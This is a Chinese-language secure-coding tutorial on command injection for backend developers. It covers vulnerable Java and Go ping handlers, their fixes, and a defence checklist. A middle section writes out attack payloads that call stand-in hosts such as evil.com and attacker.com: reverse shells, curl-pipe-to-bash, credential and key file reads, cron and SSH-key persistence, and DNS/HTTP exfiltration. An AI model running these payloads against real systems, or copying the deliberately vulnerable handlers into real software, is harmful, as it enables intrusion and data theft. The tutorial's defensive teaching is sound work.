---
title: "Day 12 — Command Injection（命令注入）：當你的後端把使用者輸入當成 shell 指令的一部分"
date: 2026-05-07
tags: ["Injection", "Command Injection"]
---

# Day 12 — Command Injection（命令注入）：當你的後端把使用者輸入當成 shell 指令的一部分

> 日期：2026-05-07
> 適合對象：後端工程師初學者
> 主題難度：★★★★☆（觀念簡單到讓人發毛，破壞力卻是直接 RCE——「在伺服器上以你 app 的身份執行任何命令」）

---

## 一、開場白：你以為你只是「呼叫一下 ImageMagick」

很多後端服務都會跟「外部程式」打交道：

- 把使用者上傳的圖片用 `convert` 縮圖
- 用 `ffmpeg` 把影片轉碼成 mp4
- 用 `git clone` 把 repo 拉下來分析
- 用 `ping` / `nslookup` 做網路連線測試
- 用 `pdftotext` 解析 PDF
- 用 `unzip`、`tar` 處理壓縮檔

每一個聽起來都人畜無害——只是「呼叫系統指令」嘛？

問題在於：**當你把「使用者送過來的字串」拼接到「要丟給 shell 執行的指令」裡面，shell 會把那個字串當成「shell 語法」來解析，而不是「資料」。**

最致命的字元只有一個分號 `;`，或是反引號 `` ` ``、`$()`、管線 `|`、雙 `&&`、雙 `||`、重新導向 `>` `<`。任何一個出現，整段命令的意義就被改寫。

> **真實案例：** 2014 年的 [Shellshock（CVE-2014-6271）](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)，bash 在處理環境變數時會錯誤地把後面的字串當函式定義執行。任何透過 CGI 把 HTTP header 寫進環境變數再呼叫 bash 的服務都中標。一行 `curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://victim/cgi-bin/...` 就 RCE。當年 Apache、DHCP client、OpenSSH 全部受影響——影響範圍以「億」為單位的伺服器要修。Command Injection 的家族成員，多半都長這個樣子。

---

## 二、最小化的 Command Injection 範例

### Java 版（最常見的犯罪現場）

```java
@GetMapping("/ping")
public String ping(@RequestParam String host) throws IOException {
    // ❌ 危險：拼字串 + 丟給 shell 執行
    Process p = Runtime.getRuntime().exec("sh -c \"ping -c 1 " + host + "\"");
    return new String(p.getInputStream().readAllBytes());
}
```

正常使用者：`GET /ping?host=8.8.8.8` → 跑 `ping -c 1 8.8.8.8`，正常。
攻擊者：`GET /ping?host=8.8.8.8;%20cat%20/etc/passwd` → 真實執行的指令是：

```
sh -c "ping -c 1 8.8.8.8; cat /etc/passwd"
```

`ping` 跑完後，shell 看到 `;`，繼續執行下一個指令，把 `/etc/passwd` 內容回傳給攻擊者。

更慘的：`?host=8.8.8.8;curl%20http://evil.com/x.sh|bash` → 直接從攻擊者伺服器下載腳本並執行，反向連線、植入挖礦、外洩資料庫——一行就到位。

### Go 版

```go
// ❌ 危險
func PingHandler(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")
    cmd := exec.Command("sh", "-c", "ping -c 1 "+host)
    out, _ := cmd.CombinedOutput()
    w.Write(out)
}
```

關鍵的錯誤：**用了 `sh -c`，再把使用者輸入拼進去**。

`exec.Command` 本身不會自動 fork 一個 shell，只要你呼叫的是 `exec.Command("ping", "-c", "1", host)`，它會直接把 `host` 當成「ping 程式的單一參數」傳進去，shell 元字元就不會被解析。但當你寫 `sh -c "ping -c 1 " + host`，整個字串會被丟進 shell，馬上回到 Java 的悲劇。

---

## 三、Command Injection 能搞出什麼花樣？

### 1. 資料外洩

```
host=anything;cat /etc/passwd
host=anything;env                      # 印出環境變數，通常含 DB_PASSWORD、API_KEY
host=anything;cat ~/.aws/credentials   # AWS 金鑰
host=anything;cat ~/.ssh/id_rsa        # 私鑰
```

### 2. 反向 shell（RCE）

```
host=anything;bash -i >& /dev/tcp/attacker.com/4444 0>&1
host=anything;curl http://evil.com/x.sh|bash
host=anything;nc attacker.com 4444 -e /bin/sh
```

只要 outbound 沒擋，攻擊者就能拿到一個互動式 shell——之後想做什麼都行。

### 3. 持久化（持續控制）

```
host=anything;echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
host=anything;crontab -l | (cat; echo "* * * * * curl http://evil/x.sh|bash") | crontab -
```

植入後門金鑰、排程工作，下次重開機照樣自動連回去。

### 4. 跳板攻擊內網

```
host=anything;curl http://10.0.0.5:8500/v1/agent/services    # 戳內網 Consul
host=anything;curl http://169.254.169.254/latest/meta-data/  # 拿 AWS metadata（IAM 角色 token）
```

跟 SSRF（Day 10）會合流：app 跑在 cloud 上面，metadata endpoint 回給你的就是「臨時 IAM token」，攻擊者用那組 token 直接 AWS API 操作整個 account。

### 5. 不需要回顯也能打：盲注（Blind Command Injection）

有時候 server 不會把指令輸出回傳給你，但攻擊者照樣能打：

- **時間盲注**：`host=anything;sleep 10` → 看回應時間長短判斷指令有沒有執行。
- **DNS 外洩**：`host=anything;nslookup $(whoami).attacker.com` → 攻擊者在 attacker.com 的 DNS log 看到查詢，就拿到 `whoami` 的結果。
- **HTTP 外洩**：`host=anything;curl http://attacker.com/?d=$(cat /etc/passwd|base64)` → 把檔案內容 base64 後當 query 送出去。

**盲注的恐怖之處：你伺服器的 log 裡看不到「攻擊命令的輸出」，但攻擊者已經拿到資料了。**

---

## 四、為什麼這麼容易中？三個關鍵誤會

### 誤會一：「我有 escape 引號就好了」

```java
// ❌ 還是錯
String safe = host.replace("\"", "\\\"");
Runtime.getRuntime().exec("sh -c \"ping -c 1 " + safe + "\"");
```

問題：你只擋了引號，但 `;`、`|`、`` ` ``、`$()`、`&&` 全部沒擋。攻擊者直接 `host=8.8.8.8;cat /etc/passwd` 都不需要引號。

把 shell 的 metacharacter 全部 blacklist 看似可行，**但 blacklist 永遠抓不完**：換行字元 `\n`、`\r`、`%0a`（URL 編碼）、`{...}`（brace expansion）、`*`（glob）、`~`（home expansion）、IFS 環境變數技巧……每一種都能繞過半成品的 escape。

### 誤會二：「我有用 array 形式呼叫就安全」

```java
// 看起來安全？
Runtime.getRuntime().exec(new String[]{"sh", "-c", "ping -c 1 " + host});
```

**沒救。** 雖然你用了 array，但你還是把使用者輸入「拼成單一字串再丟給 `sh -c`」。`sh -c` 會把那串東西當成 shell 命令來解析，分號照樣有效。

真正安全的做法是：

```java
// ✅ 安全：直接呼叫 ping，不經過 shell
Runtime.getRuntime().exec(new String[]{"ping", "-c", "1", host});
```

這樣 `host` 是「ping 程式的第三個 argv」，分號只是 ping 看不懂的字元，最多回 `unknown host`，不會變成命令分隔符。

### 誤會三：「我有用 ProcessBuilder 就安全」

```java
new ProcessBuilder("sh", "-c", "ping -c 1 " + host).start();   // ❌ 還是錯
new ProcessBuilder("ping", "-c", "1", host).start();           // ✅ OK
```

差別不在「用了 `Runtime.exec` 還是 `ProcessBuilder`」，**而是「有沒有經過 shell」**。

---

## 五、防禦的核心心法：別讓使用者輸入碰到 shell

### 1. 第一原則：能不呼叫外部程式就不要呼叫

很多功能其實有 library 可以做：

| 你想做的事 | 不要 | 改用 |
| :-- | :-- | :-- |
| 縮圖 | `convert input.png -resize 200x200 output.png` | Java：`ImageIO` / `Thumbnailator`；Go：`image/jpeg` + `golang.org/x/image/draw` |
| ZIP 解壓 | `unzip file.zip` | Java：`java.util.zip.ZipInputStream`；Go：`archive/zip` |
| 解析 JSON / XML / YAML | `python script.py` | 各語言自帶 lib |
| 計算雜湊 | `md5sum file` | Java：`MessageDigest`；Go：`crypto/md5` |

少一個 `Runtime.exec`，少一條被 inject 的路。

### 2. 必須呼叫外部程式時：用 argv 形式，不經過 shell

**Java 範例（修正版的 ping）：**

```java
@GetMapping("/ping")
public String ping(@RequestParam String host) throws IOException, InterruptedException {
    // 1) 先做白名單驗證（hostname 規格）
    if (!host.matches("^[a-zA-Z0-9.\\-]{1,253}$")) {
        throw new IllegalArgumentException("Invalid host");
    }

    // 2) 用 argv 形式，不要經過 sh -c
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", "-W", "2", host);
    pb.redirectErrorStream(true);
    Process p = pb.start();

    // 3) 設 timeout，避免被卡死
    if (!p.waitFor(5, TimeUnit.SECONDS)) {
        p.destroyForcibly();
        throw new IOException("ping timeout");
    }

    return new String(p.getInputStream().readAllBytes());
}
```

**Go 範例：**

```go
import (
    "context"
    "os/exec"
    "regexp"
    "time"
)

var hostRe = regexp.MustCompile(`^[a-zA-Z0-9.\-]{1,253}$`)

func PingHandler(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")

    // 1) 白名單驗證
    if !hostRe.MatchString(host) {
        http.Error(w, "invalid host", http.StatusBadRequest)
        return
    }

    // 2) 用 ctx 控制 timeout
    ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
    defer cancel()

    // 3) 直接呼叫 ping，不經過 sh -c
    cmd := exec.CommandContext(ctx, "ping", "-c", "1", "-W", "2", host)
    out, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, string(out), http.StatusBadRequest)
        return
    }
    w.Write(out)
}
```

> Go 的 `exec.Command(name, arg...)` **不會自動經過 shell**——只有當你顯式寫 `exec.Command("sh", "-c", ...)` 或 `exec.Command("bash", "-c", ...)` 才會踩雷。這是 Go 比較友善的設計，但很多人從別的語言過來會慣性用 `sh -c`，記得忍住。

### 3. 嚴格的白名單輸入驗證

argv 形式擋掉了「指令分隔」，但「程式本身的參數」還是有可能被惡意操控：

```java
// 即使用 argv，這個還是有問題
Runtime.getRuntime().exec(new String[]{"ping", "-c", "1", host});
```

如果 `host = "-T 1 attacker.com"`（舊版 ping 的 trace 選項）會發生什麼？或者 `host = "--option=evil"`？這是 **argument injection**——指令分隔擋了，但參數本身被注入額外的 flag。

防禦：**對輸入內容做嚴格的白名單驗證**：

```java
// hostname：英數、點、橫線，長度限制
if (!host.matches("^[a-zA-Z0-9](?:[a-zA-Z0-9.\\-]{0,251}[a-zA-Z0-9])?$")) {
    throw new IllegalArgumentException("invalid hostname");
}

// 額外保險：不能以 - 開頭（避免被當成 flag）
if (host.startsWith("-")) throw new IllegalArgumentException("...");

// 或更直接：用 -- 分隔 flag 與 positional argument
new ProcessBuilder("ping", "-c", "1", "--", host).start();
```

`--` 是大多數 GNU 工具的「之後都當 positional argument」標記，是 argument injection 的便宜防線。

### 4. 不要用 `Runtime.exec(String)` 的字串版本

Java 的 `Runtime.exec(String command)` 看起來方便，但它會用 **空格** 切割成 argv，不是經過 shell——所以你既「沒有 shell 的便利性」又「容易誤以為自己安全」。檔案路徑帶空格直接出包：

```java
// ❌ 危險加詭異
Runtime.getRuntime().exec("ping -c 1 " + host);
// 如果 host = "8.8.8.8 hello.txt" → argv 變成 ["ping", "-c", "1", "8.8.8.8", "hello.txt"]
```

**永遠用 array 版本：`exec(String[])` 或 `ProcessBuilder`。**

### 5. 最小權限 + 沙箱

即便程式碼有疏漏，跑 app 的 Linux user 不該有讀 `/etc/shadow`、寫 `/root` 的權限：

- App 用獨立 user（`appuser`）跑，不要 root。
- Container 用 read-only filesystem，只把需要寫的目錄 volume mount。
- 出方向流量用 firewall / NetworkPolicy 限制（沒 outbound = 反向 shell 開不出去、攻擊者沒辦法 `curl evil.com`）。
- AppArmor / SELinux 設 profile，限制能執行哪些 binary。
- `seccomp` 限制可呼叫的 syscall。

這些東西不是替代輸入驗證——而是「萬一有漏洞，把炸彈包到最小」。

---

## 六、容易被忽略的 Command Injection 變形

### 1. 環境變數 / Header 也會被當輸入

```java
// CGI 風格，把 HTTP header 寫進環境變數
String userAgent = request.getHeader("User-Agent");
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "logger \"$UA\"");
pb.environment().put("UA", userAgent);  // 看起來像參數化？
```

**還是危險**——shell 看到 `$UA` 會做 word splitting 跟 globbing。要麼別走 `sh -c`，要麼用更嚴格的 escape（請用 lib，例如 Apache Commons Exec 的 `CommandLine.parse` + 變數）。

### 2. `eval`、`Runtime.exec("python -c ...")`

跟 shell 一樣的概念：丟使用者輸入到任何「會把字串當程式碼解析」的地方都炸。包括：

- `python -c "print('" + name + "')"`
- Node.js 的 `eval`
- `mvn -Dproperty=` 後面接使用者輸入
- `git clone <user-supplied-url>`（**還可能 SSRF + 任意 protocol：`ext::sh -c bash`**）

### 3. 檔名 / Argument Injection

舉個經典：你的程式叫 `wget` 下載使用者給的 URL。

```java
new ProcessBuilder("wget", url).start();   // 看起來 OK
```

但 `url = "--post-file=/etc/passwd http://attacker.com"` → wget 會把 `/etc/passwd` POST 給攻擊者。完全沒有 shell metacharacter，純粹用「合法的 wget flag」就洩出去。

防禦：

- 嚴格驗證 URL（http/https only、host 白名單）。
- 用 `--` 分隔：`new ProcessBuilder("wget", "--", url)`。
- 更好：用語言原生的 HTTP client（Java：`HttpClient`；Go：`net/http`），別呼叫 `wget`。

### 4. 給 SQL DB 跑 OS 指令的功能

PostgreSQL 的 `COPY ... FROM PROGRAM`、MySQL 的 `LOAD DATA LOCAL INFILE`、MS SQL 的 `xp_cmdshell`、Oracle 的 `dbms_scheduler` ——這些是 DB 內建的「OS 命令」管道。如果先 SQL Injection，**直接升級成 RCE**。

防禦：DB 帳號別給 `pg_read_server_files`、`xp_cmdshell` 等權限。

---

## 七、常見的「我以為擋了但其實沒擋」陷阱

| 你寫的 | 為什麼還是會被打 |
| :-- | :-- |
| `host.replace(";", "")` | `&&`、`\|`、`` ` ``、`$()`、`\n` 全部沒擋 |
| `host.replaceAll("[;&\|]", "")` | 換行字元 `\n` 在 shell 裡也是命令分隔符 |
| 把使用者輸入放環境變數，再 `sh -c "use $VAR"` | shell 還是會做 word splitting / globbing |
| 用 `Runtime.exec(String)` 字串版本 | 不經過 shell 但用空格切，依然容易誤用 |
| 用 array 但呼叫 `sh -c "..."` | array 包了個假，實際還是進 shell |
| 用 array 卻沒驗證內容 | argument injection（`--post-file`、`-T`）照樣搞死 |
| 信賴 `Content-Type` / 副檔名再交給工具 | 工具本身有 vuln（ImageMagick、ghostscript） |
| 只擋 outbound TCP，沒擋 DNS | DNS 盲注照樣外洩 |

---

## 八、自我檢查清單

設計或 code review 時逐項問自己：

1. 這個功能**真的需要呼叫外部程式**嗎？有沒有 lib 可以替代？
2. 我有避免使用 `sh -c`、`bash -c`、`cmd /c` 嗎？
3. 我用的是 **argv 形式**（`new ProcessBuilder(...)` / `exec.Command(name, args...)`），不是字串拼接嗎？
4. 我對輸入做了 **白名單** 驗證（不是 blacklist）嗎？
5. 我有用 `--` 分隔 flag 與 positional argument 嗎？
6. 程式有 **timeout**，不會被卡住或拖長 attack 時間嗎？
7. App 跑的是 **非 root** 使用者嗎？檔案系統是 read-only 嗎？
8. **outbound 流量** 有被 egress firewall / NetworkPolicy 限制嗎？
9. DB 帳號有沒有 `xp_cmdshell` / `COPY FROM PROGRAM` 權限？該關的關了嗎？
10. 我的 log 能看出「有人嘗試送奇怪字元」嗎？有 alert 嗎？

---

## 九、總結與明天預告

**今天的關鍵字：「使用者送過來的字串如果會變成 shell 指令的一部分，他就可能在你伺服器上執行任何命令。」**

Command Injection 跟 SQL Injection 是親兄弟——本質都是「資料」跟「程式碼」沒有分清楚：

- SQL Injection：使用者輸入混進 SQL 字串 → 改寫查詢。防禦是 **prepared statement**。
- Command Injection：使用者輸入混進 shell 指令 → 改寫命令。防禦是 **argv 形式 + 不經過 shell**。

兩者的核心心法一樣：**把「資料通道」和「指令通道」分開**。

**Command Injection 防禦的三條底線：**

1. **能不呼叫外部程式就不要呼叫**——用語言原生 lib。
2. **必須呼叫時用 argv 形式**，**永遠不要走 `sh -c`**，再加上嚴格的白名單驗證和 `--` 分隔。
3. **最小權限 + 出方向限制**——讓 RCE 即使發生，也打不出來、撈不到資料。

---

**Day 13 預告：Insecure Deserialization（不安全的反序列化）**——當你的後端會 `ObjectInputStream.readObject()`（Java）或 `gob.Decode`（Go），使用者送一段精心構造的 byte stream 進來，就能在 deserialize 過程中觸發任意程式碼執行。我們會看為什麼 Java 的原生序列化是「設計上不安全」、為什麼 ysoserial 變成滲透測試標配、以及為什麼 JSON 不是萬靈丹（Jackson、fastjson 也炸過好幾輪）。
